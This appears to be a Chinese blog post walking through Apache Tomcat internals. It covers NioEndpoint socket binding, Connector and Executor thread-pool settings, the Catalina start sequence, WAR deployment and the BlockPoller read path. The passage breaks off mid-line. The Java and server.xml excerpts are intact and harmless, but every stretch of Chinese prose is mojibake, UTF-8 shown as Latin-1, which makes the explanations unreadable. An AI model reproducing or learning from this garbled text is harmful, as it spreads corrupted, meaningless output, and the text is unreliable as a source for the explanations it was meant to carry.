ProtocolHandleræ˜¯å¤„ç†HTTP1.1åè®®çš„ç±»(å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¥å£)ï¼Œå®ç°çš„å­ç±»æœ‰ä¸¤ä¸ªï¼ŒAbstractProtocolå’ŒHttp11NioProtocolï¼ˆç»§æ‰¿äºAbstractProtocolï¼‰AbstractProtocolæ˜¯åŸºæœ¬çš„å®ç°ï¼Œå¯ä»¥è®¤ä¸ºè¿™ä¸ªç±»æŠŠä¸»è¦çš„æ´»éƒ½å¹²äº†ï¼Œè€ŒNIOé»˜è®¤ä½¿ç”¨çš„æ˜¯Http11NioProtocolã€‚ åœ¨AbstractProtocolçš„initæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†endpoint.init();endPointæ˜¯æŠ½è±¡ç±»ï¼Œå®ç°ç±»åŒ…æ‹¬NioEndpointå’ŒNio2Endpointã€‚Endpointçš„ä¸»è¦å·¥ä½œæ˜¯å®Œæˆç«¯å£å’Œåœ°å€çš„ç»‘å®šç›‘å¬ã€‚ // NioEndPoint.java private volatile ServerSocketChannel serverSock = null; // ServerSocketChannelæ˜¯nioçš„ä¸€ä¸ªç±»ï¼Œç”¨äºç›‘å¬å¤–æ¥è¯·æ±‚çš„ protected void initServerSocket() throws Exception { serverSock = ServerSocketChannel.open(); socketProperties.setProperties(serverSock.socket()); // è¿™é‡Œé¢è®¾äº†æ˜¯å¦è¦setReuseAddressï¼Œè®¾ç½®setSoTimeoutä¸ºå¤šå°‘ InetSocketAddress addr = new InetSocketAddress(getAddress(), getPortWithOffset()); serverSock.socket().bind(addr,getAcceptCount()); //è¿™é‡Œå°±æ˜¯socket.bindçš„åœ°æ–¹äº† } // Nio2Endpoint.java @Override public void bind() throws Exception { serverSock = AsynchronousServerSocketChannel.open(threadGroup); socketProperties.setProperties(serverSock); InetSocketAddress addr = new InetSocketAddress(getAddress(), getPortWithOffset()); serverSock.bind(addr, getAcceptCount()); } å¯ä»¥çœ‹å‡ºæ¥NioEndPointå’ŒNio2EndPointåœ¨ç»‘å®šsocketçš„æ—¶å€™çš„åŒºåˆ«æ˜¯åè€…ç”¨çš„æ˜¯jdk1.7çš„AsynchronousServerSocketChannelï¼Œè€ŒServerSocketChannelæ˜¯jdk1.4å°±æœ‰çš„ã€‚javaçš„ioæ“ä½œåˆ†ä¸ºbio,nio,nio2ï¼Œtomcat8.5å¼€å§‹å»æ‰äº†bioï¼ˆå°±æ˜¯é‚£ç§é˜»å¡å¼ioï¼‰çš„æ”¯æŒã€‚ åœ¨ socketProperties.setPropertiesé‡Œé¢ï¼Œè®¾ç½®äº†socketçš„è¶…æ—¶æ—¶é—´ï¼Œå¾ˆå¥½å¥‡åˆ°åº•æ˜¯å¤šå°‘åœ¨Constants.javaä¸­ public static final int DEFAULT_CONNECTION_TIMEOUT = 60000; æ‰€ä»¥æ˜¯1åˆ†é’Ÿ? æ¥ç€NioEndPoint.javaçš„Bindæ–¹æ³•æ¥çœ‹ï¼Œèµ°åˆ°äº†selectorPool.open(getName());è¿™é‡Œé¢å°±æ˜¯å¯åŠ¨äº†ä¸€æ¡çº¿ç¨‹,NioBlockingSelector.BlockPollerç»§æ‰¿è‡ªThreadã€‚å¯¹åº”çš„runæ–¹æ³•ä¸­ä½¿ç”¨çš„æ˜¯selectoré‚£ä¸€å¥—(selector.selectedKeys()è·å¾—ä¸€ä¸ªIterator ï¼Œæ ¹æ®æ˜¯read,writeè¿˜æ˜¯connectçš„å½¢å¼å»åˆ¤æ–­)ã€‚æ³¨æ„ï¼Œæ­¤åˆ»å·²ç»å¼€å§‹selectäº†ã€‚selectè‡ªèº«æ˜¯é˜»å¡çš„ï¼Œä½†æ˜¯ä¸€æ—¦æœ‰ioäº‹ä»¶åˆ°æ¥ï¼Œå°±ä¼šå°†äº‹ä»¶äº¤ç»™çº¿ç¨‹æ± å»å¤„ç†ï¼Œæ‰€ä»¥å¹¶å‘æ€§èƒ½æ˜¯å¯ä»¥çš„ã€‚ å‚è€ƒ Tomcatå¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ï¼šåœ¨accepté˜Ÿåˆ—ä¸­æ¥æ”¶è¿æ¥ï¼ˆå½“å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯ä¸OSå®Œæˆä¸‰æ¬¡æ¡æ‰‹å»ºç«‹äº†è¿æ¥ï¼Œåˆ™OSå°†è¯¥è¿æ¥æ”¾å…¥accepté˜Ÿåˆ—ï¼‰ï¼›åœ¨è¿æ¥ä¸­è·å–è¯·æ±‚çš„æ•°æ®ï¼Œç”Ÿæˆrequestï¼›è°ƒç”¨servletå®¹å™¨å¤„ç†è¯·æ±‚ï¼›è¿”å›responseã€‚ çº¿ç¨‹æ± çš„é…ç½®æ˜¯å¯ä»¥é€šè¿‡server.xmlé…ç½®çš„ &lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix =&quot;catalina-exec-&quot; maxThreads=&quot;150&quot; minSpareThreads=&quot;4&quot; /&gt; &lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; acceptCount=&quot;1000&quot; /&gt; Connectorä¸­çš„å‡ ä¸ªå‚æ•°åŠŸèƒ½å¦‚ä¸‹ï¼š acceptCountaccepté˜Ÿåˆ—çš„é•¿åº¦ï¼›å½“accepté˜Ÿåˆ—ä¸­è¿æ¥çš„ä¸ªæ•°è¾¾åˆ°acceptCountæ—¶ï¼Œé˜Ÿåˆ—æ»¡ï¼Œè¿›æ¥çš„è¯·æ±‚ä¸€å¾‹è¢«æ‹’ç»ã€‚é»˜è®¤å€¼æ˜¯100ã€‚å…³äºè¿™ä¸ª100ï¼Œæˆ‘è®°å¾—2017å¹´çš„æ—¶å€™ï¼Œå…¬å¸åç«¯è€å¤§åœ¨ä¸€æ¬¡å†…éƒ¨æŠ€æœ¯åˆ†äº«çš„ç‚¹è¯„ç¯èŠ‚æé—®ä¸€å¸®åç«¯è¿™ä¸ªå‚æ•°æ˜¯å¤šå°‘ï¼Œå…¶å½“æ—¶è¿˜æåˆ°è¿™ä¸ªExecutorâ€œå°±æ˜¯æ¥å®¢â€çš„(åŸè¯å¦‚æ­¤)ã€‚ä¸¤å¹´åå›è¿‡å¤´æ¥å†æ¥çœ‹è¿™æ®µï¼ŒæŒºæœ‰è¶£çš„ã€‚ maxConnectionsTomcatåœ¨ä»»æ„æ—¶åˆ»æ¥æ”¶å’Œå¤„ç†çš„æœ€å¤§è¿æ¥æ•°ã€‚å½“Tomcatæ¥æ”¶çš„è¿æ¥æ•°è¾¾åˆ°maxConnectionsæ—¶ï¼ŒAcceptorçº¿ç¨‹ä¸ä¼šè¯»å–accepté˜Ÿåˆ—ä¸­çš„è¿æ¥ï¼›è¿™æ—¶accepté˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ä¼šä¸€ç›´é˜»å¡ç€ï¼Œç›´åˆ°Tomcatæ¥æ”¶çš„è¿æ¥æ•°å°äºmaxConnectionsã€‚å¦‚æœè®¾ç½®ä¸º-1ï¼Œåˆ™è¿æ¥æ•°ä¸å—é™åˆ¶ã€‚ maxThreadsè¯·æ±‚å¤„ç†çº¿ç¨‹çš„æœ€å¤§æ•°é‡ã€‚é»˜è®¤å€¼æ˜¯200ï¼ˆTomcat7å’Œ8éƒ½æ˜¯çš„ï¼‰ã€‚å¦‚æœè¯¥Connectorç»‘å®šäº†Executorï¼Œè¿™ä¸ªå€¼ä¼šè¢«å¿½ç•¥ï¼Œå› ä¸ºè¯¥Connectorå°†ä½¿ç”¨ç»‘å®šçš„Executorï¼Œè€Œä¸æ˜¯å†…ç½®çš„çº¿ç¨‹æ± æ¥æ‰§è¡Œä»»åŠ¡ã€‚maxThreadsè§„å®šçš„æ˜¯æœ€å¤§çš„çº¿ç¨‹æ•°ç›®ï¼Œå¹¶ä¸æ˜¯å®é™…runningçš„CPUæ•°é‡ï¼›å®é™…ä¸Šï¼ŒmaxThreadsçš„å¤§å°æ¯”CPUæ ¸å¿ƒæ•°é‡è¦å¤§å¾—å¤šã€‚è¿™æ˜¯å› ä¸ºï¼Œå¤„ç†è¯·æ±‚çš„çº¿ç¨‹çœŸæ­£ç”¨äºè®¡ç®—çš„æ—¶é—´å¯èƒ½å¾ˆå°‘ï¼Œå¤§å¤šæ•°æ—¶é—´å¯èƒ½åœ¨é˜»å¡ï¼Œå¦‚ç­‰å¾…æ•°æ®åº“è¿”å›æ•°æ®ã€ç­‰å¾…ç¡¬ç›˜è¯»å†™æ•°æ®ç­‰ã€‚å› æ­¤ï¼Œåœ¨æŸä¸€æ—¶åˆ»ï¼Œåªæœ‰å°‘æ•°çš„çº¿ç¨‹çœŸæ­£çš„åœ¨ä½¿ç”¨ç‰©ç†CPUï¼Œå¤§å¤šæ•°çº¿ç¨‹éƒ½åœ¨ç­‰å¾…ï¼›å› æ­¤çº¿ç¨‹æ•°è¿œå¤§äºç‰©ç†æ ¸å¿ƒæ•°æ‰æ˜¯åˆç†çš„ã€‚æ¢å¥è¯è¯´ï¼ŒTomcaté€šè¿‡ä½¿ç”¨æ¯”CPUæ ¸å¿ƒæ•°é‡å¤šå¾—å¤šçš„çº¿ç¨‹æ•°ï¼Œå¯ä»¥ä½¿CPUå¿™ç¢Œèµ·æ¥ï¼Œå¤§å¤§æé«˜CPUçš„åˆ©ç”¨ç‡ã€‚é»˜è®¤å€¼ä¸è¿æ¥å™¨ä½¿ç”¨çš„åè®®æœ‰å…³ï¼šNIOçš„é»˜è®¤å€¼æ˜¯10000ï¼ŒAPR/nativeçš„é»˜è®¤å€¼æ˜¯8192ï¼Œè€ŒBIOçš„é»˜è®¤å€¼ä¸ºmaxThreadsï¼ˆå¦‚æœé…ç½®äº†Executorï¼Œåˆ™é»˜è®¤å€¼æ˜¯Executorçš„maxThreadsï¼‰ã€‚åœ¨windowsä¸‹ï¼ŒAPR/nativeçš„maxConnectionså€¼ä¼šè‡ªåŠ¨è°ƒæ•´ä¸ºè®¾ç½®å€¼ä»¥ä¸‹æœ€å¤§çš„1024çš„æ•´æ•°å€ï¼›å¦‚è®¾ç½®ä¸º2000ï¼Œåˆ™æœ€å¤§å€¼å®é™…æ˜¯1024ã€‚ Executorçš„ä¸»è¦å±æ€§åŒ…æ‹¬ï¼š nameï¼šè¯¥çº¿ç¨‹æ± çš„æ ‡è®° maxThreadsï¼šçº¿ç¨‹æ± ä¸­æœ€å¤§æ´»è·ƒçº¿ç¨‹æ•°ï¼Œé»˜è®¤å€¼200ï¼ˆTomcat7å’Œ8éƒ½æ˜¯ï¼‰ minSpareThreadsï¼šçº¿ç¨‹æ± ä¸­ä¿æŒçš„æœ€å°çº¿ç¨‹æ•°ï¼Œæœ€å°å€¼æ˜¯25 maxIdleTimeï¼šçº¿ç¨‹ç©ºé—²çš„æœ€å¤§æ—¶é—´ï¼Œå½“ç©ºé—²è¶…è¿‡è¯¥å€¼æ—¶å…³é—­çº¿ç¨‹ï¼ˆé™¤éçº¿ç¨‹æ•°å°äºminSpareThreadsï¼‰ï¼Œå•ä½æ˜¯msï¼Œé»˜è®¤å€¼60000ï¼ˆ1åˆ†é’Ÿï¼‰ daemonï¼šæ˜¯å¦åå°çº¿ç¨‹ï¼Œé»˜è®¤å€¼true threadPriorityï¼šçº¿ç¨‹ä¼˜å…ˆçº§ï¼Œé»˜è®¤å€¼5 namePrefixï¼šçº¿ç¨‹åå­—çš„å‰ç¼€ï¼Œçº¿ç¨‹æ± ä¸­çº¿ç¨‹åå­—ä¸ºï¼šnamePrefix+çº¿ç¨‹ç¼–å· è¿™äº›å‚æ•°çš„è°ƒä¼˜æœ‰ä¸€äº›ç»éªŒ:ï¼ˆ1ï¼‰maxThreadsçš„è®¾ç½®æ—¢ä¸åº”ç”¨çš„ç‰¹ç‚¹æœ‰å…³ï¼Œä¹Ÿä¸æœåŠ¡å™¨çš„CPUæ ¸å¿ƒæ•°é‡æœ‰å…³ã€‚é€šè¿‡å‰é¢ä»‹ç»å¯ä»¥çŸ¥é“ï¼ŒmaxThreadsæ•°é‡åº”è¯¥è¿œå¤§äºCPUæ ¸å¿ƒæ•°é‡ï¼›è€Œä¸”CPUæ ¸å¿ƒæ•°è¶Šå¤§ï¼ŒmaxThreadsåº”è¯¥è¶Šå¤§ï¼›åº”ç”¨ä¸­CPUè¶Šä¸å¯†é›†ï¼ˆIOè¶Šå¯†é›†ï¼‰ï¼ŒmaxThreadsåº”è¯¥è¶Šå¤§ï¼Œä»¥ä¾¿èƒ½å¤Ÿå……åˆ†åˆ©ç”¨CPUã€‚å½“ç„¶ï¼ŒmaxThreadsçš„å€¼å¹¶ä¸æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œå¦‚æœmaxThreadsè¿‡å¤§ï¼Œé‚£ä¹ˆCPUä¼šèŠ±è´¹å¤§é‡çš„æ—¶é—´ç”¨äºçº¿ç¨‹çš„åˆ‡æ¢ï¼Œæ•´ä½“æ•ˆç‡ä¼šé™ä½ã€‚ï¼ˆ2ï¼‰maxConnectionsçš„è®¾ç½®ä¸Tomcatçš„è¿è¡Œæ¨¡å¼æœ‰å…³ã€‚å¦‚æœtomcatä½¿ç”¨çš„æ˜¯BIOï¼Œé‚£ä¹ˆmaxConnectionsçš„å€¼åº”è¯¥ä¸maxThreadsä¸€è‡´ï¼›å¦‚æœtomcatä½¿ç”¨çš„æ˜¯NIOï¼ŒmaxConnectionså€¼åº”è¯¥è¿œå¤§äºmaxThreadsã€‚ï¼ˆ3ï¼‰é€šè¿‡å‰é¢çš„ä»‹ç»å¯ä»¥çŸ¥é“ï¼Œè™½ç„¶tomcatåŒæ—¶å¯ä»¥å¤„ç†çš„è¿æ¥æ•°ç›®æ˜¯maxConnectionsï¼Œä½†æœåŠ¡å™¨ä¸­å¯ä»¥åŒæ—¶æ¥æ”¶çš„è¿æ¥æ•°ä¸ºmaxConnections+acceptCount ã€‚acceptCountçš„è®¾ç½®ï¼Œä¸åº”ç”¨åœ¨è¿æ¥è¿‡é«˜æƒ…å†µä¸‹å¸Œæœ›åšå‡ºä»€ä¹ˆååº”æœ‰å…³ç³»ã€‚å¦‚æœè®¾ç½®è¿‡å¤§ï¼Œåé¢è¿›å…¥çš„è¯·æ±‚ç­‰å¾…æ—¶é—´ä¼šå¾ˆé•¿ï¼›å¦‚æœè®¾ç½®è¿‡å°ï¼Œåé¢è¿›å…¥çš„è¯·æ±‚ç«‹é©¬è¿”å›connection refusedã€‚ èµ°åˆ°è¿™é‡Œï¼Œæ˜¯ä»BootStrap.init -&gt; Catalina.init-&gt; â€¦æ€»ä¹‹ä¸­é—´å°äº†å¾ˆå¤šå±‚ç»„ä»¶â€¦ -&gt; æ–¹æ³•çš„è°ƒç”¨æ ˆ startæ–¹æ³•çš„è°ƒç”¨æ ˆå’Œinitä¸€æ ·,bootStrapçš„startæ–¹æ³•è¢«ä»£ç†ç»™äº†catalinaçš„startæ–¹æ³•Catalina.java public void start() { try { getServer().start(); } catch (LifecycleException e) { //.... return; } if (shutdownHook == null) { shutdownHook = new CatalinaShutdownHook(); } //ç”¨äºå®‰å…¨çš„å…³é—­æœåŠ¡ Runtime.getRuntime().addShutdownHook(shutdownHook); if (await) { //è¿™ä¸ªæ˜¯true await(); //å…¶ç›®çš„åœ¨äºè®©tomcatåœ¨shutdownç«¯å£é˜»å¡ç›‘å¬å…³é—­å‘½ä»¤ stop(); } } ä¸Šé¢çš„getServerè¿”å›çš„æ˜¯serverçš„é»˜è®¤å®ç°StandardServerï¼Œåè€…çš„startInternalä¸­åˆä¼šèµ°åˆ°StandardServiceï¼Œçš„startInternalï¼Œè¿™é‡Œé¢ä¼š è°ƒç”¨Engine.start å¯åŠ¨çº¿ç¨‹æ±  å¯åŠ¨Connector ä¸€ä¸ªä¸ªæ¥çœ‹EngineStandardEngineã€StandardHostã€StandardContextã€StandardWrapperå„ä¸ªå®¹å™¨å­˜åœ¨çˆ¶å­å…³ç³»ï¼Œä¸€ä¸ªçˆ¶å®¹å™¨åŒ…å«å¤šä¸ªå­å®¹å™¨ï¼Œå¹¶ä¸”ä¸€ä¸ªå­å®¹å™¨å¯¹åº”ä¸€ä¸ªçˆ¶å®¹å™¨ã€‚Engineæ˜¯é¡¶å±‚çˆ¶å®¹å™¨ï¼Œå®ƒä¸å­˜åœ¨çˆ¶å®¹å™¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒStandardEngineåªæœ‰ä¸€ä¸ªå­å®¹å™¨StandardHostï¼Œä¸€ä¸ªStandardContextå¯¹åº”ä¸€ä¸ªwebappåº”ç”¨ï¼Œè€Œä¸€ä¸ªStandardWrapperå¯¹åº”ä¸€ä¸ªwebappé‡Œé¢çš„ä¸€ä¸ª Servletã€‚å‚è€ƒStandardEngineçš„startInternalè°ƒç”¨åˆ°çˆ¶ç±»ContainerBaseçš„startInternalæ–¹æ³•ã€‚å…·ä½“å®ç°å°±æ˜¯ç»™ä¸€ä¸ªçº¿ç¨‹æ± å»è·‘æ‰€æœ‰childçš„å¯åŠ¨ä»»åŠ¡ã€‚å½“å‰çº¿ç¨‹é€šè¿‡Future.getæ–¹æ³•é˜»å¡ç­‰å¾…æ‰€æœ‰childåˆå§‹åŒ–å®Œæ¯•ã€‚ä¸€ä¸ªchild(StandardHost)å°±æ˜¯ä¸€ä¸ªwebappï¼Œå¯ä»¥æ·»åŠ å¤šä¸ªï¼Œåˆå§‹åŒ–çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œå¹¶å‘å»åˆå§‹åŒ–å„ä¸ªwebappserver.xml &lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot; startStopThreads=&quot;4&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt; ç„¶åå¯åŠ¨PipeLineï¼ˆPipelineæ˜¯ç®¡é“ç»„ä»¶ï¼Œç”¨äºå°è£…äº†ä¸€ç»„æœ‰åºçš„Valveï¼Œä¾¿äºValveé¡ºåºåœ°ä¼ é€’æˆ–è€…å¤„ç†è¯·æ±‚ï¼Œå°±æ˜¯å¤„ç†è¯·æ±‚çš„å‰åæ‹¦æˆªå™¨ï¼‰ã€‚ValveåŒ…æ‹¬ AccessLogValve(é»˜è®¤å¼€å¯ï¼Œç”¨äºè®°å½•è¯·æ±‚æ—¥å¿—)ï¼Œ RemoteAddrValveï¼Œå¯ä»¥åšè®¿é—®æ§åˆ¶ï¼Œæ¯”å¦‚é™åˆ¶IPé»‘ç™½åå• RemoteIpValveï¼Œä¸»è¦ç”¨äºå¤„ç† X-Forwarded-For è¯·æ±‚å¤´ï¼Œç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ åŠ è½½å­å®¹å™¨çš„æ–¹æ³•æ˜¯åœ¨HostConfig(å®ç°äº†LifecycleListenerï¼Œåœ¨startä¸­å¯åŠ¨Contextå®¹å™¨)å¤„ç†çš„ã€‚HostConfig.java protected void deployApps() { File appBase = host.getAppBaseFile(); File configBase = host.getConfigBaseFile(); String[] filteredAppPaths = filterAppPaths(appBase.list()); // Deploy XML descriptors from configBase deployDescriptors(configBase, configBase.list()); // Deploy WARs deployWARs(appBase, filteredAppPaths); // Deploy expanded folders deployDirectories(appBase, filteredAppPaths); } deployWARsä¹Ÿæ˜¯ä¸¢(submit)Nä¸ªä»»åŠ¡åˆ°çº¿ç¨‹æ± ä¸­ï¼Œç„¶åè°ƒç”¨future.getä½¿å¾—å½“å‰çº¿ç¨‹é˜»å¡ç›´åˆ°æ‹¿åˆ°ç»“æœã€‚è¿™ä¸ªä»»åŠ¡å…¶å®å°±æ˜¯è§£å‹waræ–‡ä»¶(warå°±æ˜¯zipæ–‡ä»¶æ”¹äº†ä¸ªåç¼€),è¿™ä¸ªä»»åŠ¡åŒ…æ‹¬ï¼Œè°ƒç”¨javaå¤„ç†å‹ç¼©æ–‡ä»¶çš„API(JarEntry)å»è·å–æ–‡ä»¶å†…å®¹ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„deployDirectoriesæ–¹æ³•çš„æ³¨é‡Šæ˜¯ï¼ˆDeploy exploded webapps.ï¼‰ï¼Œå°±æ˜¯è¯´è§£å‹å®Œæˆä¹‹ååšçš„äº‹æƒ…ã€‚è¿™é‡Œé¢åˆæ˜¯executor.submitï¼Œç„¶åfuture.geté‚£ä¸€å¥—ä¸œè¥¿(tomcaté‡Œä¼¼ä¹å¾ˆå¤šç”¨è¿™ç§æ–¹å¼ç­‰å¾…å¤šä¸ªä»»åŠ¡å®Œæˆ)ã€‚deployWarså’ŒdeployDirectoriesä¸­éƒ½å‡ºç°äº† context = (Context) digester.parse(xml); //æ‰€ä»¥Contextæ˜¯å¯¹xmlæ–‡ä»¶çš„æè¿°ï¼Ÿ NioEndPointå’ŒNioEndPoint2è¿™ä¿©æ˜¯å¦‚ä½•å®ç°ä»socketæ¥å—è¯·æ±‚å¹¶å°†å…¶è½¬åŒ–ä¸ºhttpè¯·æ±‚çš„ï¼ŸNioEndPointæ¥çœ‹NioEndPointçš„æ³¨é‡ŠNIO tailored thread pool, providing the following services: Socket acceptor thread Socket poller thread Worker threads poolWhen switching to Java 5, thereâ€™s an opportunity to use the virtual machineâ€™s thread pool.ï¼ˆè¿™æ®µä¼¼ä¹æ˜¯ä½¿ç”¨äº†System.inheritedChannelè¿™ä¸ªæ–¹æ³•ï¼Œå…³äºè¿™ä¸ªæ–¹æ³•çš„ä»‹ç»éå¸¸å°‘ï¼‰ public class NioEndpoint extends AbstractJsseEndpoint&lt;NioChannel,SocketChannel&gt; { } // SocketChannel,ByteChannel,ScatteringByteChannel,GatheringByteChannelæ˜¯nioçš„class public class NioChannel implements ByteChannel, ScatteringByteChannel, GatheringByteChannel { } ä»æ³¨é‡Šæ¥çœ‹,NioEndPointçš„åŠŸèƒ½åŒ…æ‹¬(ç›‘å¬socketçš„çº¿ç¨‹ï¼Œpollçš„çº¿ç¨‹ï¼Œä»¥åŠä¸€ä¸ªå·¥ä½œåˆ†å‘çš„çº¿ç¨‹æ± )ç›‘å¬æ˜¯è¿™ä¸€æ®µ: serverSock = ServerSocketChannel.open(); serverSock.socket().bind(addr,getAcceptCount()); //bindæ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯requested maximum length of the queue of incoming connections.å°±æ˜¯è¿æ¥ç­‰å¾…é˜Ÿåˆ—çš„æœ€å¤§é•¿åº¦ pollåœ¨è¿™é‡Œï¼Œåªæœ‰ä¸€æ¡çº¿ç¨‹ protected static class BlockPoller extends Thread { //çº¿ç¨‹åå­—å«åš â€œâ€ poller.setName(name + &quot;-BlockPoller&quot;); // ç»“æœä¸€èˆ¬æ˜¯ NioBlockingSelector.BlockPoller public void run() { while (run &amp;&amp; iterator != null &amp;&amp; iterator.hasNext()) { SelectionKey sk = iterator.next(); NioSocketWrapper socketWrapper = (NioSocketWrapper) sk.attachment(); try { iterator.remove(); sk.interestOps(sk.interestOps() &amp; (~sk.readyOps())); if (sk.isReadable()) { countDown(socketWrapper.getReadLatch()); //è¿™é‡Œå°±æ˜¯é€šçŸ¥åœ¨ç­‰å¾…çš„Pollerçº¿ç¨‹ï¼Œå¯ä»¥å¼€å§‹è¯»äº† } if (sk.isWritable()) { //è¿™é‡Œæ˜¯é€šçŸ¥åœ¨ç­‰å¾…çš„Pollerçº¿ç¨‹ï¼Œå¯ä»¥å¼€å§‹å†™äº† countDown(socketWrapper.getWriteLatch()); } } catch (CancelledKeyException ckx) { sk.cancel(); countDown(socketWrapper.getReadLatch()); countDown(socketWrapper.getWriteLatch()); } } } } æ‰€ä»¥BlockPollerï¼ˆçº¿ç¨‹åNioBlockingSelector.BlockPollerï¼‰è¿™æ¡çº¿ç¨‹çš„ä½œç”¨ä¸»è¦å°±æ˜¯å¾ªç¯ç›‘å¬æ˜¯å¦æœ‰äº‹æƒ…å‘ç”Ÿï¼Œæœ‰äº‹æƒ…å‘ç”Ÿä¹‹åä½¿ç”¨CountDownLatch.countDownï¼Œè®©æ­£åœ¨ç­‰å¾…çš„çº¿ç¨‹å¼€å§‹è¯»ã€‚é‚£ä¹ˆæ˜¯å“ªæ¡çº¿ç¨‹åœ¨ç­‰å¾…ï¼Ÿçº¿ç¨‹æ˜¯ä»€ä¹ˆæ—¶å€™å¼€å§‹ç­‰å¾…çš„ï¼Ÿåœ¨Http11InputBuffer.fillæ–¹æ³•ä¸­ nRead = socketWrapper.read(block, byteBuffer); // æ­¤æ—¶è¿è¡Œåœ¨çº¿ç¨‹æ± ä¸­ï¼Œä¹Ÿå°±æ˜¯å·¥ä½œçº¿ç¨‹ //è¿™ä¸ªæ–¹æ³•è°ƒç”¨åˆ°äº†NioBlockingSelector.readæ–¹æ³• while (!timedout) { if (keycount &gt; 0) { //only read if we were registered for a read read = socket.read(buf); if (read != 0) { break; //å¦‚æœè¯»å–åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼Œé‚£ä¹ˆç›´æ¥è·³å‡ºå¾ªç¯ï¼Œä¸èµ°ä¸‹é¢é‚£ä¸€å¥— } } try { if (att.getReadLatch()==null || att.getReadLatch().getCount()==0) { att.startReadLatch(1); //åˆ›å»ºä¸€ä¸ªCountDownLatch(1) } poller.add(att,SelectionKey.OP_READ, reference); //æ³¨å†Œä¸€ä¸‹æ„Ÿå…´è¶£çš„äº‹ä»¶ att.awaitReadLatch(AbstractEndpoint.toTimeout(readTimeout), TimeUnit.MILLISECONDS); //åœ¨è¿™é‡Œå¼€å§‹ç­‰å¾… } catch (InterruptedException ignore) { // Ignore } } //è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå†™ï¼Œä½œä¸ºä¸€ä¸ªè¯»æ–¹æ³•ï¼Œé‚£ä¹ˆå¦‚æœæ²¡æœ‰è¯»å–åˆ°ä¸œè¥¿ï¼Œæ˜¯ä¸æ˜¯å°±éœ€è¦å†™ä¸€ä¸ªwhileå¾ªç¯ï¼Œè¿™ä¼šæµªè´¹å¾ˆå¤šcpu cycleï¼Œè¿˜ä¸å¦‚æ³¨å†Œä¸€ä¸‹äº‹ä»¶ï¼ŒæŠŠè½®è¯¢çš„ä»»åŠ¡äº¤ç»™osã€‚ æ‰€ä»¥ç­‰å¾…çš„æ˜¯çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹ï¼Œåˆ›å»ºäº†ä¸€ä¸ªCountDownLatch(1)ï¼Œç­‰åœ¨é‚£é‡Œã€‚äºæ­¤åŒæ—¶BlockPollerçº¿ç¨‹ä¸€ç›´åœ¨è·‘ï¼Œå‘ç°æ–°çš„Readäº‹ä»¶ï¼Œä»attachMent(SocketWrapperä¸­è·å–è¿™ä¸ªCountDownLatchï¼ŒcountDownä¸€ä¸‹ï¼Œè¿™é‡Œå°±èƒ½å¤Ÿæ¢å¤ç»§ç»­æ‰§è¡Œ) ä»ç³»ç»Ÿçš„ready keysä¸­è·å–äº‹ä»¶:processKey -&gt; AbstractEndPoint.processSocket -&gt; Executor.execute(SocketProcessorBase)(åœ¨è¿™é‡Œå¼€å§‹åˆ†å‘åˆ°å·¥ä½œçº¿ç¨‹æ± ) -&gt; NioEndPoint.SocketProcessor.doRun -&gt; AbstractProtocol.ConnectionHandler.process -&gt; Processor.process -&gt; AbstractProcessorLight.process -&gt; Http11Processor.service(SocketWrapperBase&lt;?&gt; socketWrapper) -&gt; Http11InputBuffer.parseRequestLine(è¿™é‡Œå°±å¼€å§‹è¯»å–Http1.1è¯·æ±‚ï¼Œæ¯”è¾ƒå¤æ‚) èµ°åˆ°Http11InputBufferè¯´æ˜ä¸€å®šæ˜¯http1.1çš„è¯·æ±‚æ ¼å¼äº†(ä½†è¿™æœ‰å¯èƒ½æ˜¯webSocketæˆ–è€…http2çš„upgradeè¯·æ±‚)ï¼Œåœ¨å“ªé‡Œåˆ¤æ–­æ˜¯äº¤ç»™http1.1è¿˜æ˜¯http2.0è¿˜æ˜¯ajpåè®®ï¼Ÿåœ¨AbstractProcessorLight.processä¸­åˆ¤æ–­äº†å¦‚æœsocket.status == SocketEvent.OPEN_READ(å°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªè¿æ¥ä¸Šçš„ï¼Œåˆšåˆšå‡†å¤‡å¥½å¯ä»¥è¯»çš„è¿æ¥ï¼Œæ‰€ä»¥é»˜è®¤ç›´æ¥äº¤ç»™http1.1å»å¤„ç†äº†ï¼Œå°±ç®—æ˜¯http2åé¢è¿˜æ˜¯å¯ä»¥upgradeçš„) ä¸Šé¢æåˆ°NioSocketWrapperæ˜¯ä¸€ä¸ªattachMentï¼Œè¿™ä¸ªç±»çš„å®ä¾‹çš„åˆ›å»ºæ˜¯åœ¨Acceptorä¸­å‘ç”Ÿçš„ã€‚åœ¨NioEndPoint.javaçš„startInternalæ–¹æ³•ä¸­ï¼Œæœ‰è¿™ä¹ˆä¸€æ®µ // Start poller thread poller = new Poller(); //è¿™ä¸ªPollerå’Œä¸Šé¢çš„BlockingPollerä¸ä¸€æ · Thread pollerThread = new Thread(poller, getName() + 